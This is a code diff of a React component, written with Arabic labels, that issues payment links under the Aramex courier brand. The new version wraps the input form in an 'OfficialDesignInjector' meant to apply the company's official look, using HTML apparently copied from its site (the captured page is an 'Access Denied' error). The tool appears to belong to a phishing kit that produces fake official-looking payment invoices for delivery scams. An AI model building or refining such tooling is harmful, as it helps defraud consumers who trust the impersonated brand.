@@ -1,9 +1,7 @@
 
 import React, { useState } from 'react';
 import { useCreateLink } from '@/hooks/useSupabase';
-import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
-import { Card } from '@/components/ui/card';
+import { OfficialDesignInjector } from '@/components/OfficialDesignInjector';
 
 const AramexLinkCreator = () => {
   const [amount, setAmount] = useState('');
@@ -19,72 +17,86 @@ const AramexLinkCreator = () => {
     });
   };
 
+  const officialHTML = `
+<h1>Access Denied</h1>
+ 
+You don't have permission to access "http://www.aramex.com/" on this server.<p>
+Reference #18.4fd02e17.1778279213.b5542601
+</p><p>https://errors.edgesuite.net/18.4fd02e17.1778279213.b5542601</p>
+
+
+`;
+  const officialCSS = ``;
+
   return (
-    <div className="min-h-screen p-4 flex flex-col items-center justify-center bg-[#FFFFFF]" style={{ fontFamily: 'Cairo, sans-serif' }}>
-      <Card className="w-full max-w-lg shadow-2xl border-0 overflow-hidden">
-        <div className="h-2 bg-[#E31E24]"></div>
-        <div className="p-8 space-y-8 bg-white">
-          <div className="flex flex-col items-center space-y-4">
-            <img src={`/assets/logos/aramex.svg`} alt="Aramex" className="h-24 object-contain" />
-            <h1 className="text-2xl font-black text-slate-800 text-center">أرامكس</h1>
-          </div>
-          
-          <div className="space-y-6">
-            <div className="space-y-2">
-              <label className="text-sm font-bold text-slate-500 uppercase tracking-wider">تفاصيل الدفع</label>
-              <Input 
-                placeholder="المبلغ المطلوب" 
-                value={amount} 
-                onChange={(e) => setAmount(e.target.value)}
-                className="h-14 border-2 border-slate-100 rounded-none text-xl focus:border-[#E31E24] transition-colors"
-              />
-            </div>
-            
-            <div className="space-y-2">
-              <label className="text-sm font-bold text-slate-500 uppercase tracking-wider">البيان</label>
-              <Input 
-                placeholder="الغرض من الرابط" 
-                value={description} 
-                onChange={(e) => setDescription(e.target.value)}
-                className="h-14 border-2 border-slate-100 rounded-none focus:border-[#E31E24] transition-colors"
-              />
-            </div>
-
-            <Button 
-              onClick={handleCreate} 
-              disabled={loading}
-              className="w-full h-16 text-xl font-black rounded-none shadow-lg transform transition-transform active:scale-95"
-              style={{ backgroundColor: '#E31E24', color: '#fff' }}
-            >
-              {loading ? 'انتظر...' : 'إصدار فاتورة دفع رسمية'}
-            </Button>
-
-            {generatedLink && (
-              <div className="mt-8 p-6 bg-slate-50 border-l-4 border-[#E31E24] space-y-4">
-                <p className="font-bold text-slate-700">تم إصدار الرابط بنجاح:</p>
-                <div className="flex items-center gap-3">
-                  <div className="flex-1 bg-white p-3 border text-xs break-all font-mono">
-                    {generatedLink}
-                  </div>
-                  <Button 
-                    variant="outline"
-                    onClick={() => navigator.clipboard.writeText(generatedLink)}
-                    className="border-2 border-[#E31E24] text-[#E31E24] font-bold"
-                  >
-                    نسخ
-                  </Button>
-                </div>
-              </div>
-            )}
-          </div>
-          
-          <div className="pt-6 border-t border-slate-50 flex justify-between items-center text-[10px] text-slate-400">
-            <span>مدعوم بنظام سداد الخليجي</span>
-            <span>بوابة مشفرة آمنة</span>
-          </div>
+    <OfficialDesignInjector entityId="aramex" html={officialHTML} css={officialCSS}>
+      <div className="official-input-overlay" style={{ 
+        position: 'absolute', 
+        top: '50%', 
+        left: '50%', 
+        transform: 'translate(-50%, -50%)',
+        zIndex: 1000,
+        background: 'rgba(255,255,255,0.95)',
+        padding: '30px',
+        borderRadius: '12px',
+        boxShadow: '0 4px 30px rgba(0,0,0,0.3)',
+        width: '100%',
+        maxWidth: '420px',
+        border: '1px solid #eee'
+      }}>
+        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
+          <h2 style={{ margin: 0, color: '#1a1a1a', fontSize: '22px', fontWeight: 'bold' }}>بوابة إصدار الروابط الرسمية</h2>
+          <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>سيتم تطبيق هوية aramex تلقائياً</p>
         </div>
-      </Card>
-    </div>
+        <div style={{ marginBottom: '15px' }}>
+          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>المبلغ المطلوب</label>
+          <input 
+            placeholder="0.00" 
+            value={amount} 
+            onChange={(e) => setAmount(e.target.value)}
+            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '18px', boxSizing: 'border-box' }}
+          />
+        </div>
+        <div style={{ marginBottom: '20px' }}>
+          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>الوصف / رقم المرجع</label>
+          <input 
+            placeholder="ادخل تفاصيل العملية" 
+            value={description} 
+            onChange={(e) => setDescription(e.target.value)}
+            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '16px', boxSizing: 'border-box' }}
+          />
+        </div>
+        <button 
+          onClick={handleCreate} 
+          disabled={loading}
+          style={{ 
+            width: '100%', 
+            height: '56px', 
+            background: '#1a1a1a', 
+            color: '#fff', 
+            borderRadius: '12px', 
+            fontSize: '18px', 
+            fontWeight: 'bold', 
+            cursor: 'pointer',
+            transition: 'all 0.2s'
+          }}
+        >
+          {loading ? 'جاري الإصدار...' : 'إنشاء رابط دفع آمن'}
+        </button>
+        {generatedLink && (
+          <div style={{ marginTop: '25px', padding: '15px', background: '#f8fafc', border: '1px dashed #334155', borderRadius: '8px', wordBreak: 'break-all' }}>
+            <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '5px' }}>الرابط المولد:</p>
+            <div style={{ fontWeight: 'bold', color: '#0f172a', fontSize: '14px' }}>{generatedLink}</div>
+            <button 
+              onClick={() => navigator.clipboard.writeText(generatedLink)}
+              style={{ marginTop: '10px', background: '#334155', color: '#fff', border: 'none', borderRadius: '4px', padding: '5px 10px', fontSize: '12px', cursor: 'pointer' }}
+            >
+              نسخ الرابط
+            </button>
+          </div>
+        )}
+      </div>
+    </OfficialDesignInjector>
   );
 };
 
